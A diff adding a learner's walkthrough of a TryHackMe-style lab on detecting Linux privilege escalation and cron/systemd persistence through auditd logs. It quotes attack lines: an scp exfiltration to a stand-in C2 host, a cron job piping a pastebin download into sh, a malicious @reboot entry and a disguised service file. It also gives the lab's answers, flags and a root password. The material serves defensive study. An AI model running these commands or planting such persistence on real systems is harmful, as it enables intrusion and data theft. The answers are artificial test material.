@@ -158,7 +158,11 @@ Attackers, once they get past Initial Access they face various difficulties. We 
 
 ### Detecting Privilege Escalation
 
-
+Detecting privilege escalation is tricky for SOCs. There are hundreds of Linux misconfigurations and thousands of software vulnerabilities that can be exploited, so hunting for the exploit itself is like finding a needle in a haystack.
+Instead of chasing every possible technique, SOCs look for more common attack indicators: 
+	- A sudden UID/GID change 
+	- A low-privilege account spawning a root shell
+	- A process tree that doesn't make sense.
 
 Reference syntax for confirming privilege escalation by comparing effective user before and after:
 
@@ -181,53 +185,135 @@ tar czf dump.tar.gz /root /etc/                       # Archiving sensitive data
 scp dump.tar.gz attacker@c2-server.thm:~              # Exfiltrating the data
 
 ```
+Even if you don't know how the **PwnKit** exploit works, you can still find anomalies using some common attack indicators.
+	- Spot suspicious activity
+	- Confirm whether privilege escalation succeeded by comparing the user before and after the exploit
+	- If the user has changed, the attacker succeeded in **privilege escalation**
 
+**Example: Looking for Reverse Shell Activity & PwnKit Privilege Escalation**
 
+```
+root@thm-vm:~$ ausearch -i -x pwnkit # The PwnKit was launched by serviceuser (Look at the UID field)
+type=PROCTITLE msg=audit(09/19/25 17:56:12.154:416) : proctitle=/tmp/pwnkit
+type=SYSCALL msg=audit(09/19/25 17:56:12.154:416) : ppid=24302 pid=24304 auid=unset uid=serviceuser key=exec
+
+root@thm-vm:~$ ausearch -i --ppid 24304 # The PwnKit spawned a root shell (Look at the UID field)
+type=PROCTITLE msg=audit(09/19/25 17:56:12.807:418) : proctitle=bash
+type=SYSCALL msg=audit(09/19/25 17:56:12.807:418) : ppid=24304 pid=24310 auid=unset uid=root key=exec
+
+root@thm-vm:~$ ausearch -i --ppid 24310 # The threat actor continues the attack as root user
+type=PROCTITLE msg=audit(09/19/25 17:56:15.225:424) : proctitle=whoami
+type=SYSCALL msg=audit(09/19/25 17:56:15.225:424) : ppid=24310 pid=24312 auid=unset uid=root key=exec
+```
+---
+
+Continue with the TryPingMe scenario and find out what followed the reverse shell!
+You can start the hunt from ausearch -i -if /home/ubuntu/scenario/audit.log.
 
 ---
 
-**Which command line was used to look for the "pass" keyword in files?**
+**1. Which command line was used to look for the "pass" keyword in files?**
 
-**Answer:**
+<p align="center">
+<img src=screenshots/linux3_passcommand.png width="700">
+</p>
+An attacker will run discovery commands on the victim to obtain information or data, such as user login credentials and stored passwords, to perform privilege escalation. This is why looking for specific commands that include the keyword "pass" can be useful; in a real investigation, you would broaden the search to include pass, pwd, password... Type proctitle and keyword pass will return all commands that include the keyword pass.
+Command: **ausearch -i -if /home/ubuntu/scenario/audit.log | grep "type=PROCTITLE" | grep "pass"**
 
-**Which command line was used to escalate privileges to root?**
+**Answer: grep -iR pass .**
 
-**Answer:**
+---
 
-**Looking at the detected .env file, what was the root password?**
+**2. Which command line was used to escalate privileges to root?**
 
-**Answer:**
+<p align="center">
+<img src=screenshots/linux3_suroot.png width="700">
+</p>
+Attackers may sometimes land themselves in a system that privilages are not protected and by running sudo su, or sudo root they can find themselves in full control. We can filter specifically for commands containing the word "root"
+Command: ausearch -i -if /home/ubuntu/scenario/audit.log | grep "type=PROCTITLE" | grep "root"
+
+**Answer: su root**
+
+---
+
+**3. Looking at the detected .env file, what was the root password?**
+
+<p align="center">
+<img src=screenshots/linux3_grepenv.png width="700">
+</p>
+I was finding myself tripped up to follow processes, and just coming from Windows Logs, it is good to note that Event ID in Linux is a serial code, a one-time event. In Windows, they're reused to identify a specific process, always the same numbers. Ran the command to find any .env file
+Command: **sudo ausearch -i -if /home/ubuntu/scenario/audit.log | grep ".env"**
+type=PROCTITLE msg=audit(09/23/25 14:53:44.238:2137) : proctitle=cat .env.local
+
+We found the command but in order to read it we need the exact path, since we used grep we lose some of the information on the log block. If we add the flags -A 3 to the command will return the first line of the block; Auditd blocks here are 4 lines (PROCTITLE, CWD, EXECVE, SYSCALL), your match is line 1, so you need 3 more lines after it, hence -A 3
+Command: **sudo ausearch -i -if /home/ubuntu/scenario/audit.log | grep -A 3 ".env"**
+<p align="center">
+<img src=screenshots/linux3_grepa.png width="700">
+</p>
+
+<p align="center">
+<img src=screenshots/linux3_password.png width="700">
+</p>
+
+**Answer: nGql1pQkGa**
+
+---
 
 ## Task 4: Startup Persistence
 
 ### Persistence in Linux
 
+Standalone servers can run for years without a single reboot... Attackers expect this, so their best offense is a slow one.
+	- How do attackers achieve backdoor persistence?
+	- What are the most common ones?
 
 
 ### Cron Persistence
 
-```
-@reboot nohup /home/<user>/.<hidden-directory>/<malware-name> > /dev/null 2>&1 &
-```
+Windows has scheduled tasks; **Cron jobs** behave much the same way. **Scheduled Tasks** and **Cron Jobs** are the most popular persistence method.
+	- How do you ensure these tasks survive a reboot?
+	- Attackers will simply add a line to the victims cron job file located at /var/spool/cron/user 
+		- This will ensure the malware runs on every boot
 
 ```
+# A line added by APT29 to /var/spool/cron/<user> to run malware on boot
+@reboot nohup /home/<user>/.<hidden-directory>/<malware-name> > /dev/null 2>&1 &```
+
+```
+Another **Example:**]
+	- Rocke cryptominer:
+		- Installs a script at **/etc/cron.d/root** 
+		- The script runs ***/10** on its code which means the script will redownload every **10** minutes
+		- Even if IT deletes it, it can quickly redownload
+
+**Rocke Cryptominer 10 Second Re-Download Script**
+```
+# A simplified command that adds the cron job to /etc/cron.d/root
 echo "*/10 * * * root (curl https://pastebin.com/raw/1NtRkBc3) | sh" > /etc/cron.d/root
+
 ```
-
-
 
 ### Systemd Persistence
 
+**Systemd** is in charge of the most critical components of your machine. 
+
 ```
+# Simplified contents of /lib/systemd/system/cloud-online.service file
 [Unit]
-Description=Initial cloud-online job
+Description=Initial cloud-online job    # Fake description to mimic a trusted service
 [Service]
-ExecStart=/usr/bin/cloud-online
+ExecStart=/usr/bin/cloud-online         # GOGETTER malware disguised as a trusted file
+
 ```
 
 
 
 ### Detecting Persistence
+
+**Cron Jobs** and **Systemd** can be monitired by having rules set in auditd. 
+	- **crontab** to search for managing cron jobs
+	- **systemctl** for managing services
+
 
 | Monitor changes in cron job files | /etc/crontab, /etc/cron.d*, /var/spool/cron/*, /var/spool/crontab/* |
 |---|---|
@@ -237,19 +323,112 @@ ExecStart=/usr/bin/cloud-online
 Reference syntax:
 
 ```
-ausearch -i -f /etc/systemd
-ausearch -i -x crontab
+root@thm-vm:~$ ausearch -i -f /etc/systemd # Look for file changes inside /etc/systemd
+type=PROCTITLE msg=audit(09/22/25 16:55:12.740:806) : proctitle=vi /etc/systemd/system/malicious.service
+type=PATH msg=audit(09/22/25 16:55:12.740:806) : item=1 name=/etc/systemd/system/malicious.service
+type=CWD msg=audit(09/22/25 16:55:12.740:806) : cwd=/
+type=SYSCALL msg=audit(09/22/25 16:55:12.740:806) : syscall=openat [...] a2=O_WRONLY|O_CREAT|O_EXCL ppid=1265 pid=1310 uid=root exe=/usr/bin/vi key=systemd
+
+root@thm-vm:~$ ausearch -i -x crontab # Look for execution of crontab command
+type=PROCTITLE msg=audit(09/22/25 17:25:14.933:807) : proctitle=crontab -e
+type=SYSCALL msg=audit(09/22/25 17:25:14.933:807) : syscall=execve [...] ppid=1265 pid=1316 uid=root key=exec
+```
+---
+
+In this task, try to detect two persistence methods by using auditd logs (ausearch -i).
+Once detected, launch the persisted malware (e.g. /bin/malware) and get your flag!
+Note: You might need to switch to root for this task by running sudo su
+
+---
+
+**1. What flag did you get after running the malware persisting as a service?**
+
+<p align="center">
+<img src=screenshots/linux3_persistence.png width="700">
+</p> 
+Searching for malicious services we started with: **ausearch -i -f /etc/systemd**. 
+type=PROCTITLE msg=audit(09/23/25 17:06:42.860:834) : proctitle=nano /etc/systemd/system/tux.service
+Now that we have the full path, we ran: **sudo systemctl start tux.service**
+	- This runs the malware service...
+	- We pull out our powerful log tool **journalctl** to see the actions ran by tux.service
+		- journalctl -u tux.service
+
+```
+root@thm-vm:/home/ubuntu$ sudo systemctl start tux.service
+root@thm-vm:/home/ubuntu$ journalctl -u tux.service
+WARNING: terminal is not fully functional
+Press RETURN to continue 
+Jul 07 00:59:17 thm-vm systemd[1]: Started tux.service - Tux Helper Library.
+Jul 07 00:59:17 thm-vm tux[1822]: =========================================
+Jul 07 00:59:17 thm-vm tux[1822]: Good job finding me! Where did I persist
+Jul 07 00:59:17 thm-vm tux[1822]: Example: /folder/name.service
+Jul 07 00:59:17 thm-vm tux[1822]: =========================================
+Jul 07 00:59:17 thm-vm tux[1822]: Your answer: Incorrect, try again!
+Jul 07 00:59:17 thm-vm tux[1822]: =========================================
+Jul 07 00:59:17 thm-vm tux[1822]: Press Enter to exit...
+Jul 07 00:59:17 thm-vm systemd[1]: tux.service: Deactivated successfully.
+root@thm-vm:/home/ubuntu$ 
+```
+We tried funning the service file directly from the path we found but, the message is there, incorrect answer, where do I persist file/path try again... We read the tux.service file with:
+
+```
+root@thm-vm:/home/ubuntu$ cat /etc/systemd/system/tux.service                                                                
+[Unit]
+Description=Tux Helper Library
+Wants=network-online.target
+After=network-online.target
+
+[Service]
+ExecStart=/var/lib/misc/tux
+
+[Install]
+WantedBy=multi-user.target
+```
+
+This leads us to run the file with the path: /var/lib/misc/tux
+<p align="center">
+<img src=screenshots/linux3_penguin.png width="700">
+</p> 
+
+**Answer: THM{hidden_penguin!}**
+
+---
+
+**2. What flag did you get after running the malware persisting as a cron job?**
+
+If an SOC suspects there has been a cronjob added but they dont know to which user, they can run: 
+**ls -la /var/spool/cron/crontabs/**
+
+```
+oot@thm-vm:/home/ubuntu$ ls -la /var/spool/cron/crontabs/
+total 12
+drwx-wx--T 2 root crontab 4096 Sep 23  2025 .
+drwxr-xr-x 3 root root    4096 Oct 22  2024 ..
+-rw------- 1 root crontab 1015 Sep 23  2025 root
+```
+
+This will tell us the lastest cronjob set by what user, with that information we can filter by edited crontab jobs for root. 
+Command: **sudo crontab -l -u root**
+<p align="center">
+<img src=screenshots/linux3_phoenix.png width="700">
+</p> 
+
+```
+root@thm-vm:/home/ubuntu$ sudo /usr/sbin/phoenix
+=========================================
+Good job finding me! Where did I persist
+Example: /folder/cronfile
+=========================================
+Your answer: /var/spool/cron/crontabs/root   
+THM{ressurect_on_reboot!}
+=========================================
+Press Enter to exit...
 ```
 
 
-
-**What flag did you get after running the malware persisting as a service?**
-
 **Answer:**
 
-**What flag did you get after running the malware persisting as a cron job?**
-
-**Answer:**
+---
 
 ## Task 5: Account Persistence
 
